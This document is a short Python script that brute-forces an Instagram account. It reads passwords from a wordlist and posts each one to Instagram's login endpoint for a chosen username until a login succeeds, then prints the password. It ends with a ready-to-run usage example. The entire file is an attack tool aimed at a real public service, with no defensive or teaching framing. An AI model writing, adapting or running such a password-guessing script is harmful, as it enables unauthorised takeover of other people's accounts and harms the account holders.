import requests

def brute_force_instagram(username, wordlist_file):
    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.readlines()
        total_passwords = len(passwords)
        counter = 0
        for password in passwords:
            password = password.strip()
            counter += 1
            print(f'Attempt {counter}/{total_passwords}')
            try:
                response = requests.post('https://www.instagram.com/accounts/login/ajax/',
                                         data={'username': username, 'password': password})
                if 'authenticated' in response.text:
                    print(f'Found Password: {password}')
                    break
            except requests.exceptions.RequestException as e:
                print(f'Error trying the password: {password} - {str(e)}')

# Usage example
username = 'the instagram profile'
wordlist_file = 'rockme.txt'
brute_force_instagram(username, wordlist_file)
